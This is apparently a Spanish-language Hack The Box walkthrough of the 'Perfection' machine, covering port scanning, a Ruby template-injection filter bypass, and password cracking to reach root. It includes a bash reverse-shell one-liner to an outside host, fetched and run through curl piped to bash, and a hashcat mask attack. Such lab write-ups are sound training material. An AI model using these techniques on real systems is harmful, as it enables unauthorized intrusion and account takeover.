---
title: HTB Perfection Writeup
date: 2024-07-06 08:00:00 -05:00
author: retxus
categories: [HTB, Linux]
tags: [Linux, SSTI, BurpSuite, Cracking]
comments: false
image:
    path: /assets/img/HTB-Perfection/Perfection.png
---

Muy buenas con todos, el día de hoy voy a resolver la máquina `Perfection` de HTB, espero que el procedimiento sea de su agrado y fácil de comprender.

## Reconocimiento

Primero vemos si tenemos conexión con la máquina y de paso gracias al `ttl` identificamos ante el tipo de máquina que estamos, en `linux` este suele ser de 64 y en `windows` de 128.

```bash
ping -c 1 10.10.11.25ping -c 1 10.10.11.253
PING 10.10.11.253 (10.10.11.253) 56(84) bytes of data.
64 bytes from 10.10.11.253: icmp_seq=1 ttl=63 time=162 ms

--- 10.10.11.253 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 161.515/161.515/161.515/0.000 ms
```

Vemos que el `ttl` de la máquina es de 63, el cual está próximo a 64 por ende nos encontramos ante una máquina `Linux`.

Ahora vamos a identificar los puertos abiertos dentro de la máquina, los invito a usar el siguiente `script` hecho en `bash`.

```bash
#!/bin/bash

GREEN="\e[32m"
RED="\e[31m"
RESET="\e[0m"

IP="$1"

if [ -z "$IP" ]; then
  echo "Uso: $0 <IP>"
  exit 1
fi

TEMP_FILE=$(mktemp)

echo -e "${GREEN}[+] Escaneando todos los puertos abiertos... ${RESET}"

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn "$IP" -oG "$TEMP_FILE"

# Extraer los puertos abiertos
PORTS=$(grep -oP '\d+/open' "$TEMP_FILE" | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//'; echo)

rm "$TEMP_FILE"

if [ -z "$PORTS" ]; then
  echo -e "${RED}[-] No se encontraron puertos abiertos.${RESET}"
  exit 1
fi

echo -e "\n${GREEN}[+] Escanenado servicios en los puertos: $PORTS. ${RESET}\n"

nmap -sCV -p"$PORTS" "$IP" -oN target

echo -e "\n${GREEN}[+] Escano completado. Resultados en 'target'.${RESET}\n"
```

De preferencia es mejor usar este `script` como `root`, ya que algunos parámetros de `nmap`, requieren de privilegios elevados. Esto al final nos va a generar un archivo `target` que contiene la información de los puertos abiertos dentro de la máquina.

```bash
sudo ./scan.sh 10.10.11.44
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El escaneo, no nos otorga mucha información, pero vamos a enumerar la web. Primero vemos qué tecnologías se usan o algún `CMS`.

```bash
whatweb 10.10.11.253

http://10.10.11.253 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx, WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)], IP[10.10.11.253], PoweredBy[WEBrick], Ruby[3.0.2], Script, Title[Weighted Grade Calculator], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]
```

Bueno, podemos ver algo llamado `WEBrick` y vemos que se usa `Ruby` y nos dicen su versión. Vamos al navegador a ver qué tenemos. Podemos ver que nos dicen algo de una calculadora de calificaciones. En la parte de arriba, al lado de `about us` si le damos clic, nos lleva a una calculadora. Vamos a ver qué podemos hacer aquí.

![](/assets/img/HTB-Perfection/1_Perfection.png)

Podemos ver que si llenamos los campos en la tabla, estos se muestran en la parte de abajo. En vista de esto, podemos pensar en un ataque del tipo `SSTI`

## SSTI a RCE

Bueno, para continuar con las pruebas hacemos uso de `BurpSuite`, así que interceptamos la petición y la mandamos al `Repeater`.

![](/assets/img/HTB-Perfection/2_Perfection.png)

Probamos a poner comillas y en la respuesta vemos que nos detectan como un input malicioso, si recordamos con el comando `whatweb` nos reportó que el lenguaje de programación es `Ruby`, [aquí](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/#ruby){:target="_blank"}, nos indican como podemos realizar un `SSTI` en ese lenguaje, como nos bloquea las entradas maliciosas, probamos también a poner un espacio en blanco en formato `url_encode` y el payload a inyectar también debe estar en ese mismo formato, para hacer eso en `BurpSuite`, seleccionas lo que queremos en-codear y le damos a `Ctrl+u`.

![](/assets/img/HTB-Perfection/3_Perfection.png)

Como podemos ver, nos devuelve el resultado de la multiplicación, así que asumimos que funciona. En la misma web nos dicen cómo podemos lograr una ejecución de comandos, vamos a intentar leer el `/etc/passwd`.

![](/assets/img/HTB-Perfection/4_Perfection.png)

Vemos que se pudo, así que vamos a intentar ganar acceso.

## Ganando acceso

Hay varias formas de hacerlo, pero en esta ocasión lo hice de la siguiente manera. Primero, hice un archivo con el siguiente contenido.

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Luego me pongo en escucha con `netcat`, levanto un servidor con `python` y en la máquina con curl solicito el archivo pipiándolo con `bash`.

![](/assets/img/HTB-Perfection/5_Perfection.png)

Una vez dentro hacemos el tratamiento de la `tty`.

```bash
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset xterm
export TEMR=xterm
```
Y podemos ver la primera `flag`.

## Escalada de privilegios

Vemos que dentro de nuestro directorio personal de usuario, hay una carpeta en donde podemos ver una base de datos. Si revisamos su contenidos vemos una tabla con nombres de usuarios y lo que parece ser su contraseña encriptada.

![](/assets/img/HTB-Perfection/6_Perfection.png)

Tratamos de romper el `hash`, pero no se puede. Vemos que en la ruta `/var/mail` tenemos un correo que parece dirigido a `susan` y nos dicen cuál es el formato que tienen las contraseñas (primer nombre_primer nombre al revés_número aleatorio entre 1 y 1,000,000,000). En vista de que el correo está dirigido a `susan`, tratamos de averiguar su credencial. Podemos hacerlo con `hashcat`.

```bash
hashcat -m 1400 hash -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d


abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

Vemos que nos da la contraseña, ahora intentamos cambiar a ese usuario. Lo logramos y, si hacemos un, `id` vemos que `susan` está en el grupo `sudo`, así que proporcionando la credencial podemos ejecutar cualquier comando.

![](/assets/img/HTB-Perfection/7_Perfection.png)

Bueno, ahora ya somos root y logramos ver la última `flag`
